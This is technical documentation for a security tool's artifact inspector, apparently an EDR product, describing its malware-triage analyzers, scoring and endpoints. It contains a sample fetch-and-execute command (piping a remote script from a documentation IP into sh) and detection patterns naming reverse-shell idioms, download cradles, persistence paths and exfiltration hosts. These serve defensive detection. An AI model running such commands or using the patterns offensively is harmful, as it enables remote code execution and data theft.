# Artifact analyzers: shortcuts, disk images, macros, scripts, CI/config

Five analyzers registered with `RegisterAnalyzer` in the artifact inspector. They add no new kinds or routes: they run on the existing `file`, `script` and `config` kinds (`POST /v1/inspect/file|script|config`, `kavachctl inspect file|script|config`). All are parse-only: nothing is executed, mounted, extracted, fetched or stored, each analyzer honours the builder caps (200 findings, 500 IOCs, 16 layers, 512-char strings) and the 5 s per-analyzer budget, and each has a `recover()` so a hostile input becomes an analyzer error, never a crash. Scoring caps are unchanged; weights are in the table below and feed the existing top-10 sum.

| Analyzer | Kind | Code | Finding ids |
|---|---|---|---|
| `file-lnk` | file | `inspect_file_lnk.go` | `lnk-arguments`, `lnk-lolbin-target`, `lnk-args-*`, `lnk-unc-target`, `lnk-long-args`, `lnk-minimised`, `lnk-icon-mismatch`, `lnk-appended-data`, `lnk-malformed` |
| `file-diskimage` | file | `inspect_file_iso.go` | `iso-autorun`, `iso-executable`, `iso-shortcut`, `iso-script`, `iso-lnk-plus-payload`, `iso-empty`, `disk-image-unlisted` |
| `file-vba` | file | `inspect_file_vba.go` | `vba-autoexec`, `vba-shell-object`, `vba-winapi`, `vba-obfuscated-strings`, `vba-download-exec`, `vba-no-source` |
| `script-static` | script | `inspect_script_static.go` | `scr-download-exec`, `scr-reverse-shell`, `scr-eval-decoded`, `scr-persist-{cron,systemd,shellrc,sshkey,preload,launchd,wintask}` |
| `config-extra` | config | `inspect_config_extra.go` | `cfgx-gha-*`, `cfgx-gl-*`, `cfgx-k8s-*`, `cfgx-df-*` |
| `file-dotnet` | file | `inspect_file_dotnet.go` | `dotnet-assembly`, `dotnet-pinvoke`, `dotnet-pinvoke-injection`, `dotnet-reflective-load`, `dotnet-download-exec`, `dotnet-powershell-host`, `dotnet-resource-pe`, `dotnet-resource-packed`, `obf-dotnet-obfuscator`, `obf-dotnet-names`, `dotnet-malformed` |
| `file-onenote` | file | `inspect_file_onenote.go` | `onenote-embedded-executable`, `onenote-embedded-script`, `onenote-embedded-shortcut`, `onenote-embedded-container`, `onenote-launcher-name`, `onenote-lure-text`, `onenote-many-embeds`, `onenote-no-embeds` |
| `pkg-manifest` | file, lockfile, script | `inspect_pkg_manifest.go` | `ext-*`, `npm-*`, `pypi-cmdclass-hook`, `pkg-*` |

## Complete analyzer catalogue

Every analyzer registered with `RegisterAnalyzer` (or `registerFileAnalyzer`, the file-kind wrapper that skips empty input and adds a `recover()`), verified against the source. The registry is exposed by `InspectAnalyzerNames()`. A submission runs every analyzer registered for its kind, each under a 5 s budget (`InspectAnalyzerTime`); a timeout or panic becomes an analyzer error in the report and results already added are kept. Report-wide caps: 200 findings, 500 IOCs, 16 layers, 512-char strings, input 32 MiB (text kinds 4 MiB), recursion depth 8.

| Analyzer | Kind(s) | Code | What it checks | Notable limits |
|---|---|---|---|---|
| `file-binary` | file | `inspect_file_pe.go`, `_elf.go`, `_macho.go` | Format sniff then PE/DOS-MZ (sections, RWX, entropy, packer sections, UPX, entry point placement, import API groups, timestamps, overlay, Authenticode presence), ELF (RWX segments, odd interpreter, stripped, UPX, LD_PRELOAD, ptrace, `/proc/mem`, fileless exec) and Mach-O (unsigned, risky entitlements, `DYLD_INSERT`, injection APIs). Ids `file-pe-*`, `file-elf-*`, `file-macho-*`. | 8 MiB hashed per section, 96 sections, 5,000 imports |
| `file-archive` | file | `inspect_file_archive.go` | ZIP and gzip trees: path traversal, executables, scripts, disk images, shortcuts, double and disguised extensions, encrypted entries, decompression bombs, deep nesting. Ids `file-arch-*`. | 20,000 entries listed, 64 MiB total decompressed per tree, 16 MiB per nested read, unzip ratio flag at 200 |
| `file-document` | file | `inspect_file_document.go` | OOXML (macros, ActiveX, embedded objects, external relationships, template injection, UNC targets, DDE), PDF (auto-run JavaScript/Launch, name obfuscation, encryption) and OLE2 (macro, DDE, embedded, encrypted). Ids `file-ooxml-*`, `file-pdf-*`, `file-ole-*`. | 2 MiB per OOXML entry, 24 MiB total, 60 XML parts |
| `file-strings` | file | `inspect_file_strings.go` | ASCII and UTF-16LE string runs (min length 6): network IOCs, crypto-wallet strings, ransom-note wording. Ids `file-str-*`. | 24 MiB scanned, 60,000 strings, 4 MiB total |
| `file-lnk`, `file-diskimage`, `file-vba`, `file-dotnet`, `file-onenote` | file | see sections below | shortcuts, ISO images, VBA macros, .NET metadata, OneNote embeds | per section below |
| `similarity` | file | `inspect_sim_analyzer.go` | Computes import/symbol/entropy-vector hashes, CTPH and LSH digests (Meta `similarity.digests`) and compares with earlier stored submissions: `sim-near-duplicate`, `sim-imphash-match`, `sim-symhash-match` (weights 4, or 12 when the earlier report scored 40 or more). See [research-similarity.md](research-similarity.md). | digests a leading 8 MiB window (`similarity:digest-window`) |
| `byte-patterns` | file, script | `inspect_bytes_loader.go`, `bytecontent/*.json` | Embedded, validated JSON rule packs (c2, credentials, loaders, lolbin, macro, miners, packers, persistence, powershell, ransom, reverseshells, webshells). Packs are strict-decoded and every rule must pass its own positive/negative samples and a benign-fixture check at load. | 60 findings per inspection, pack file 8 MiB |
| `deobfuscation` | script, cmdline | `inspect_deob_analyzer.go`, `_decode.go` | Layered decoder chain (hex escape, base64, XOR on small blobs, decompression and others), IOC extraction (URL, IP, host, exe names) and download-cradle findings `deob-cradle-*` (downloadstring, webrequest, curl-sh, certutil, bitsadmin, iex-remote). Obfuscation-only weight is budgeted to 35 so it cannot alone reach the verdict threshold of 40. | text 2 MiB, blob 1 MiB, XOR blob 64 KiB, 200 matches per decoder per pass, 8 rule findings |
| `obfuscation-stats` | script, cmdline | `inspect_obf_analyzer.go` | Standardised logistic model over text features (`obf-*` findings); see [research-obfuscation.md](research-obfuscation.md). Inputs under 24 characters are skipped (Meta `skipped`: "too short for statistics"). | obf weight budget 25, model version "1" |
| `script-static` | script | `inspect_script_static.go` | See "Script static analysis". | per section |
| `config-assess` | config | `inspect_config_analyzer.go` | Embedded policy assessment of recognised config formats (compliance percentage over pass/fail); emits info `cfg-unrecognized-format` when no format matches. Not scored. | |
| `config-extra` | config | `inspect_config_extra.go` | CI YAML, Kubernetes, Dockerfile checks. Not scored. | 2 MiB |
| `config-advisory` | config | `inspect_config_advisory.go`, `configadvisories/*.json` | Compares a BIG-IP `#TMSH-VERSION:` or an nginx version string with a versioned, operator-replaceable advisory table (`cfg-advisory-<cve>`). See [appliance-config-review.md](appliance-config-review.md). Not scored. | 2 MiB scanned, 5000 advisories |
| `config-firewall` | config | `inspect_config_firewall.go` | Generic firewall/WAF rule export review (`fw-*`): any-any allows, world-reachable admin and data ports, shadowed and redundant rules, no default deny, unused rules and objects. See [firewall-rule-review.md](firewall-rule-review.md). Not scored. | 5000 rules, 64 atoms per field, 20M comparisons |
| `lockfile` | lockfile | `inspect_lockfile_analyzer.go` | See [lockfile-inspection.md](lockfile-inspection.md). | |
| `pkg-manifest` | file, lockfile, script | `inspect_pkg_manifest.go` | Extension manifests, npm install hooks, PyPI `setup.py`. | per section |
| `domain` | domain | `inspect_domain.go` | See [domain-inspector.md](domain-inspector.md). | |
| `url` | url | `inspect_url_analyzer.go` | See [url-email-inspection.md](url-email-inspection.md). | |
| `email`, `email-extra` | email | `inspect_email_analyzer.go`, `inspect_email_extra.go` | See [url-email-inspection.md](url-email-inspection.md) and the email section below. | |

Per kind (from the registrations above): file 12, script 5 (`byte-patterns`, `deobfuscation`, `obfuscation-stats`, `script-static`, `pkg-manifest`), cmdline 2 (`deobfuscation`, `obfuscation-stats`), config 5, lockfile 2 (`lockfile`, `pkg-manifest`), domain 1, url 1, email 2. Use `InspectAnalyzerNames()` for the live list.

Verdict note: findings carry a weight and the score is a capped sum of the strongest ten; `config` reports are `not_scored`. A finding absent from a report means "not matched by this analyzer", never "verified clean".

Later additions on the same contract: .NET triage, OneNote carving, extension and package install-script analysis (sections below), plus two read-only reporting endpoints, `GET /v1/inspect/clusters` and `GET /v1/inspect/sarif` (sections at the end). The `obf-dotnet-*` findings share the existing obfuscation budget (`InspectObfuscationCap`), so obfuscation alone never produces a verdict; no scoring constant changed.

## Calling the inspector, and how the verdict is built

All routes need `Authorization: Bearer <token>` (or a console session). `file` takes raw bytes (max 32 MiB) with an optional `?name=`; the text kinds (`script`, `cmdline`, `domain`, `config`, `lockfile`, `url`, `email`) take raw text or JSON `{"text": "...", "name": "..."}` (max 4 MiB). Empty input is 400, oversize 413.

```sh
curl -s -X POST "http://127.0.0.1:8099/v1/inspect/script" \
  -H "Authorization: Bearer $KAVACH_TOKEN" -H 'Content-Type: application/json' \
  -d '{"text":"curl -s http://198.51.100.7/x.sh | sh","name":"install.sh"}'
curl -s -X POST "http://127.0.0.1:8099/v1/inspect/file?name=invoice.zip" \
  -H "Authorization: Bearer $KAVACH_TOKEN" --data-binary @invoice.zip
curl -s "http://127.0.0.1:8099/v1/inspect/analyzers" -H "Authorization: Bearer $KAVACH_TOKEN"
curl -s "http://127.0.0.1:8099/v1/inspect/reports?limit=10" -H "Authorization: Bearer $KAVACH_TOKEN"
```

Response shape (`InspectReport`; values illustrative, fields abridged):

```json
{"id":"insp-...","time":"...","kind":"script","name":"install.sh","sha256":"...","size":42,
 "findings":[{"id":"deob-cradle-curl-sh","title":"...","severity":"high","technique":"T1105","evidence":"...","weight":15,"analyzer":"deobfuscation"}],
 "iocs":[{"type":"url","value":"http://198.51.100.7/x.sh"}],
 "layers":[], "meta":{}, "score":43, "level":"suspicious",
 "factors":["... (+28)","... (+15)"],
 "analyzers":["byte-patterns","deobfuscation","obfuscation-stats","pkg-manifest","script-static"],
 "limits_hit":[], "errors":[], "mode":"observe-only", "note":"..."}
```

`GET /v1/inspect/analyzers` returns `{"analyzers": {kind: [names]}, "max_bytes": 33554432, "mode": "observe-only"}`; `GET /v1/inspect/reports` returns `{count, reports, mode}` with the newest stored reports (no input bytes).

Verdict: the score is the sum of the weights of the ten heaviest findings (weight-0 findings never count), plus 40 when an extracted IOC matches the IOC store, capped at 100. Obfuscation-only findings share one budget of 35 (`InspectObfuscationCap`). Levels: `clean` below 15, `low` 15-39, `suspicious` 40-69, `malicious-likely` 70 and above. Kind `config` is never scored: score 0, level `not_scored`. There is no hidden model; each counted finding is listed in `factors`. Reports go to a capped in-memory ring and are lost on restart.

## Windows shortcuts (.lnk)

Reads the MS-SHLLINK header, LinkInfo (local base path) and StringData (relative path, arguments, icon location, working dir; ANSI or UTF-16). Reports the target, arguments, icon location and show command in Meta `file-lnk.lnk`, extracts URLs from the arguments as IOCs, and flags a LOLBin target (cmd, powershell, mshta, wscript, rundll32, regsvr32, certutil, bitsadmin, msiexec and similar), encoded/downloading/hidden/IEX/script-host arguments, UNC targets, very long or whitespace-padded arguments, a document-looking icon on a shell/script-host target, and a large block appended after the structures.

Caveats: the target IDList (shell item tree) is not decoded, so a shortcut that stores its target only there and has no LinkInfo/RelativePath shows no target. Argument patterns are regexes on the visible string, not a command-line parser. `lnk-minimised` and the icon check are weak signals.

## Disk images

Lists an ISO 9660 image from the primary volume descriptor, or the Joliet descriptor when present, walking directories breadth-first from memory. Flags root `autorun.inf`, executables/libraries, `.lnk` files, scripts, and the shortcut-plus-payload pairing used to carry files past mark-of-the-web. VHD, VHDX and DMG are recognised and reported (`disk-image-unlisted`) but not listed.

Limits: 5,000 entries, 800 directories, depth 8, 1 MiB per directory, 200 names kept in Meta; hitting one reports `file-diskimage:iso-entries|iso-dirs|iso-depth|iso-dir-size|iso-listing` in `limits_hit`. Directory loops are broken by a visited set.

Caveats: UDF-only images, Rock Ridge long names, multi-extent files and file contents are not read (an executable renamed to `.txt` is not flagged; an executable named `.exe` that is harmless is). ISO 9660 names are the 8.3 form unless Joliet is present, so extension checks follow what the image declares.

## VBA macros

Carves MS-OVBA compressed module source out of the bytes by its `Attribute VB_` prologue, decompresses it in memory (output capped at 1 MiB per module, 64 modules, 400 carve attempts), and matches: auto-exec subs (`AutoOpen`, `Document_Open`, `Workbook_Open`, ...), `Shell`/`WScript.Shell`/`CreateObject`/XMLHTTP/ADODB.Stream, Win32 `Declare ... Lib` and shellcode-loader APIs, `Chr()`/concatenation/reversal/very long lines, and URLs. The recovered text is also run through the shared deobfuscation decoder chain; each decoded layer is recorded in the report's layer log (method `vba:<decoders>`), and download cradles found in decoded text produce the usual `deob-cradle-*` findings. Works on `vbaProject.bin` inside OOXML and on legacy OLE2 files.

Caveats, which are significant: this is carving, not a CFB/VBA parser. Modules stored in fragmented sectors or in the OLE mini-stream (small modules in many real files), p-code-only projects, VBA stomping and password-protected projects yield no source; the analyzer then reports `vba-no-source` (info) rather than "clean", and the existing `file-ooxml-macro` / `file-ole-macro` findings still apply. XLM (Excel 4.0) macros are not analysed. Heuristics match well-known idioms and will miss novel ones and flag some legitimate automation.

## Script static analysis

For kind `script` (shell, Python, JavaScript/Node, with PHP/Perl idioms). One finding per rule: download-and-execute (`curl | sh`, `bash <(curl ...)`, `exec(urlopen().read())`, `eval(await fetch())`), reverse shells (`/dev/tcp`, `nc -e`, `mkfifo`, `socat exec:`, Python/Perl/Node/PHP socket-plus-shell), eval of a decoded blob (`eval(base64...)`, `atob`, `base64 -d | sh`, `zlib.decompress`), and persistence writes (cron, systemd units, shell rc files, `authorized_keys`, `ld.so.preload`, launchd, scheduled tasks and Run keys). Base64 literals that feed these idioms are decoded in memory (up to 12 blobs, nesting depth 3, 1 MiB each) and logged as layers with method `script:eval-b64-literal`; the decoded text is scanned with the same rules and any hit cites `decoded layer N`. Limits report as `script-static:script-blobs`, `script-decode-depth`, `script-truncated` (input scanned up to 2 MiB). This analyzer complements, and does not replace, `deobfuscation`, `byte-patterns` and `obfuscation-stats`, so one script can produce overlapping findings from several analyzers; the verdict only counts the strongest ten.

Caveats: regex idioms, not data-flow. Commands assembled from variables or split strings, uncommon syntax, and non-literal blobs are missed; the shell/Python/JS language label is a guess and every rule runs on every script. A legitimate installer that really does `curl | sh` will be flagged.

## Config checks (CI YAML, Kubernetes, Dockerfile)

`config-extra` runs next to `config-assess` for kind `config`. It detects GitHub Actions workflows and GitLab CI files, and for Kubernetes and Dockerfile inputs adds a few checks the embedded policy set does not have. Findings are `[fail]` observations with weight 0 and the report level is `not_scored` (score 0), exactly as for other config assessments; a missing finding is not a pass. Checks: pull_request_target checking out PR head, untrusted event fields expanded in `run:`, `permissions: write-all`, unpinned third-party actions, curl-pipe-shell, `ACTIONS_ALLOW_UNSECURE_COMMANDS`, self-hosted runners on PR triggers, secrets echoed; GitLab latest/untagged images, literal secret variables, dind without TLS, job-token exposure; Kubernetes anonymous RBAC subjects, open `loadBalancerSourceRanges`, inline Secret data, fetch-and-exec commands; Dockerfile reverse shell, decode-and-exec, miners, fetch-then-chmod.

Caveats: text patterns over the submitted file, not a YAML evaluation. Anchors, includes, templates, matrix expansion and reusable workflows are not resolved. For CI YAML `config-assess` has no policies and still emits its info finding `cfg-unrecognized-format`; ignore it, the `cfgx-*` findings and Meta `config-extra.summary` are the result. Input is scanned up to 2 MiB (`config-extra:config-truncated`).

## .NET assemblies

For a PE with a CLR data directory (`file-dotnet`). Reads the COR20 header, the metadata root and stream directory, and the `#~` tables stream (every table is sized so later ones can be located; only Assembly, AssemblyRef, TypeRef, MemberRef, ModuleRef, ImplMap and ManifestResource are decoded). Meta `file-dotnet.dotnet` carries the runtime string, assembly name/version, IL-only and strong-name flags, assembly references, P/Invoke imports (`dll!function`) and embedded resources with size and entropy. Findings: three or more memory/loader APIs among the P/Invokes (28), `Assembly.Load`/`GetDelegateForFunctionPointer` together with base64/decompress/resource-read members (30), download members next to start/load/invoke (14), a reference to `System.Management.Automation` (8), an embedded resource that is itself a PE (25) or a 16 KiB+ resource at entropy 7.2+ (20), known obfuscator marker strings (ConfuserEx, Dotfuscator, SmartAssembly, Eazfuscator, .NET Reactor, Babel and others; 15) and a high share of unprintable/invisible-unicode names (12).

Limits: 64 MiB metadata, 4M rows per table, 400 listed references/imports/resources, 20,000 member refs, 16 streams, 8 MiB hashed per resource; hitting the row cap reports `file-dotnet:dotnet-table-rows`.

Caveats: the IL is never read. Method bodies, strings in `#US`, custom attributes and generic signatures are not decoded, so behaviour that exists only in IL (encrypted strings, a loader built from `calli`) is invisible; the reflective-load and download findings come from member and type names, which an obfuscator can rename. Obfuscator detection is by marker strings that a stripper can remove. Compressed or encrypted resources are measured by entropy, not unpacked. Tables with a schema this parser does not know (portable-PDB tables, anything above 0x2C) stop table decoding, which then yields fewer facts, not an error. Mixed-mode assemblies are triaged by their managed side only.

## OneNote (.one)

Recognises the OneNote file GUID and carves FileDataStoreObject records by their header GUID, length and bounds (128 records, 8 MiB each). Each payload is classified by magic bytes (PE, ELF, LNK, CHM, ZIP, OLE2, PDF) or script keywords (`<script`, WScript.Shell, PowerShell, IEX, mshta, `cmd /c`, ...), hashed (the sha256 becomes an IOC) and, for scripts, URL-scanned. UTF-16LE and ASCII text runs are searched for launcher file names (`.hta .wsf .vbs .js .bat .cmd .ps1 .exe .scr .lnk .chm ...`), click-to-open lure wording and URLs. An embedded executable weighs 35, script 30, shortcut/CHM 28, launcher name 22 (with an embed present), lure text 10.

Caveats: the revision-store object graph is not walked, so an attachment is not tied to the picture or hyperlink that presents it and a lure string anywhere in the file counts. A payload stored compressed or encrypted inside the attachment is seen only as `data`. Names come from text runs and can include names from inside a carved script. Hitting a limit reports `file-onenote:onenote-embeds|onenote-embed-size|onenote-embed-range`.

## Browser extensions, npm and PyPI

`pkg-manifest` accepts raw text (kinds `lockfile` or `script`, with the file name as a hint) or a file that is a zip/CRX, an npm tarball or a PyPI sdist (`.tar.gz`). From an archive it reads only `manifest.json`, `package.json`, `setup.py` and the small `.js/.py/.sh` files an install hook names (1 MiB per member, 16 MiB total, 4,000 members, 48 side files, depth 2); nothing is installed, imported or run.

- Extension manifests (Chrome and Firefox, MV2 and MV3): dangerous permissions (`debugger`, `nativeMessaging`, `proxy`, `management`, `cookies`, `webRequestBlocking`, clipboard, capture and others, each weighted 3-14), broad host access (`<all_urls>`, `*://*/*`, also in content scripts), cookies or request interception combined with all-sites access, CSP `'unsafe-eval'` or a remote script origin, a non-store `update_url`, broad `externally_connectable`, search/homepage overrides.
- npm `package.json`: the `preinstall`, `install`, `postinstall`, `prepare` and publish hooks are matched against curl-pipe-shell, obfuscated `eval` (base64, `fromCharCode`, `zlib`, `marshal`), webhook and collector hosts (Discord, Slack, webhook.site, Pipedream, ngrok, interactsh/oast, Telegram bot API, pastebin, transfer.sh and similar), environment harvesting plus a network call, credential file access and reverse shells. An unfamiliar install hook with no hit is a weight-6 note; common ones (`node-gyp rebuild`, `husky install`, `npm run build`, `tsc`) are ignored.
- PyPI `setup.py`: a `cmdclass` that overrides `install`/`develop`/`egg_info` (8), and the same code rules over the whole file, since top-level code also runs at install.

Caveats: regex over text, not a JavaScript or Python parser. Code that a hook calls but that is not in the submitted archive is not seen (a bare `package.json` shows only the hook line); code reached through dependencies, `require` chains or downloaded later is invisible; a webhook host list is finite and a self-hosted collector is missed. `wheel` and `.whl` files, `pyproject.toml` build backends, signed CRX verification and `.xpi` Firefox packages beyond plain zip are not handled. Many legitimate extensions request broad access; the finding says what the extension can do, not that it does it. Limits report as `pkg-manifest:pkg-members|pkg-archive-bytes|pkg-zip-entries|pkg-text-truncated`.

## Cross-report correlation: GET /v1/inspect/clusters

Groups the stored reports (the 200-entry in-memory ring; no input bytes exist to read) by factors they share: IOCs (URL, domain, IP, email, wallet, hashes; paths and registry keys count 0.4), each report's own sha256 (so a dropper that embeds a child's hash links to the child's report), matched IOC-store ids, and the similarity digests (import hash, ELF symbol hash, Mach-O hash, identical CTPH/LSH strings; the entropy-vector hash counts 0.4). Two reports are linked when the weights of their shared factors reach `min_score` (default 1); a cluster is a connected set of links (single linkage). Each cluster returns its members (id, sha256, name, kind, score, level), the `shared_factors` with the reports that carry them, the pairwise `links` with the factors that justify each, and an `explanation`. A deterministic id (`clu-` plus a hash of member sha256 values) is stable across calls.

Caps: 200 reports considered, 300 factors per report, factors shared by more than 40 reports (or by half of the reports once there are 6 or more) are ignored as common and listed in `ignored_common_factors`, noise hosts (w3.org, schemas.microsoft.com and similar) are skipped, 20,000 tracked links, at most 50 clusters, 50 members, 30 shared factors and 40 links per cluster. `limits_hit` reports `reports`, `pairs` or `clusters`. Parameters: `min_score`, `limit`, `kind`. Read-only; `kavachctl inspect clusters` and the MCP tool `inspect_clusters` call it.

Caveats: single linkage can chain two unrelated groups through one shared indicator; raise `min_score` or read `links` to see which factor bridges them. A shared indicator is shared evidence, not a common author, and a clean cluster does not mean the members are clean. Reports age out of the ring and the ring is lost on restart. Near-duplicate (non-identical) fuzzy digests are not compared here; use `/v1/inspect/similar`.

## SARIF export: GET /v1/inspect/sarif

`?id=<report id|latest>` or `?sha256=<hash>` returns the stored report as a SARIF 2.1.0 log (`application/sarif+json`), for CI code-scanning ingestion. It is pull-only: the server never pushes it anywhere. One run, tool `kavach-inspector`; a rule per distinct finding id (title, ATT&CK technique as a tag and help URI); a result per finding (`critical`/`high` map to `error`, `medium` to `warning`, the rest to `note`; `rank` is the finding weight; a `partialFingerprints` entry is `sha256:findingId`); the artifact with its SHA-256 and length; analyzer errors and limits as tool notifications; the score, level, factors and note in run properties. The artifact location is the report's name reduced to a base name, or `sha256:<hash>` when there is none, never a local path. `kavachctl inspect sarif ID|latest` prints it to stdout and the MCP tool `inspect_sarif` fetches it.

Caveats: SARIF expects source locations; an inspected artifact has none, so results carry the artifact URI only and code-scanning UIs show them at file level. `config` reports are not scored, and their findings export as notes or warnings by severity. Only reports still in the ring can be exported.

## Email and phishing: `email` and `email-extra`

`POST /v1/inspect/email` (authed, body capped at the 4 MiB text limit; raw `.eml` or Outlook `.msg` bytes, or JSON `{"text": ...}`). The base `email` analyzer (`inspect_email_analyzer.go`, `inspect_email_mime.go`, see `docs/url-email-inspection.md`) covers headers (reported SPF/DKIM/DMARC, Received-chain anomalies, From/Reply-To/Return-Path mismatch, display-name spoofing, homoglyph From domains through the domain analyzer), the MIME tree (depth, part, size caps), attachment listing with dangerous and double extensions, HTML body checks (link text/href mismatch, forms, scripts, hidden text) and URL extraction; attachments are decoded in memory and handed to the file and script analyzers. `email-extra` (`inspect_email_extra.go`) adds, with ATT&CK tags:

| Finding id | Technique | Meaning |
|---|---|---|
| `email-x-att-double-ext`, `email-x-att-dangerous-ext` | T1566.001 | document-looking name ending in an executable/container/macro/HTML type; dangerous extension (weights 12 and 8, deliberately small: the base analyzer already scores the same attachment) |
| `email-x-hidden-link`, `email-x-empty-link` | T1566.002 | anchor hidden by CSS (display:none, zero size/font, opacity 0), or with no visible text or image |
| `email-x-qr-image-name`, `email-x-qr-image-hint`, `email-x-qr-lure-text` | T1566.002 | quishing hints: QR-like image name or tag, or "scan the QR code" wording next to an image. The image is not decoded |
| `email-x-defanged-url` | T1566.002 | `hxxps://x[.]y` style text; the refanged URL is added as an IOC |
| `email-x-tracking-pixel` | none | 1x1/0-size remote image (info, weight 0) |
| `email-x-msg-detected`, `email-x-msg-attachments` | T1566.001 | Outlook `.msg` |

`.msg` support is a detector only: OLE2 magic plus `__substg1.0_` / `__properties_version1.0` markers, an attachment storage count, candidate dangerous file names and URLs from an ASCII/UTF-16 string scan, and the whole file handed to the file analyzers (`email-msg-*` ids). The CFB directory is not walked, so subject, sender, headers and attachment bytes are not extracted. Nothing is fetched or executed and no bytes are stored.

Caveats: regex over HTML, not a renderer (CSS in `<style>` blocks and classes is not resolved); SPF/DKIM/DMARC are only what the receiving server wrote, DKIM is not recomputed; refanging and QR checks are hints; legitimate newsletters use tracking pixels and hidden preheaders.

## Tests

`internal/edr/inspect_artifacts_test.go` holds hand-built fixtures (no binary blobs are checked in): golden findings per analyzer, benign cases that must stay clean, limit tests (string caps, entry/module/blob/depth caps, directory loops, decompression cap, oversize input), a seeded mutation test and `FuzzArtifactAnalyzers` (`go test ./internal/edr -run XXX -fuzz FuzzArtifactAnalyzers -fuzztime 20s`). `inspect_integration_artifacts_test.go` drives each analyzer through the HTTP endpoints.

`inspect_extra_test.go` covers the later additions: a .NET assembly built byte by byte (PE, COR20 header, metadata root and tables, resources) with malicious and benign variants, truncation and mutation sweeps and a hostile row count; a OneNote builder with embedded-file records; extension, npm tarball, sdist and setup.py fixtures including benign install hooks that must stay quiet; correlation (golden clusters, determinism, own/embedded hash links, digest factors, common-factor suppression, output and input caps); a SARIF shape check; `TestInspectEndToEndExtra` through the real endpoints; and `FuzzExtraAnalyzers` (`go test ./internal/edr -run XXX -fuzz FuzzExtraAnalyzers -fuzztime 20s`). The CLI and MCP tools have their own request-shape tests (`cmd/kavachctl/inspect_cluster_test.go`, `cmd/kavach-mcp/tools_inspect_cluster_test.go`).
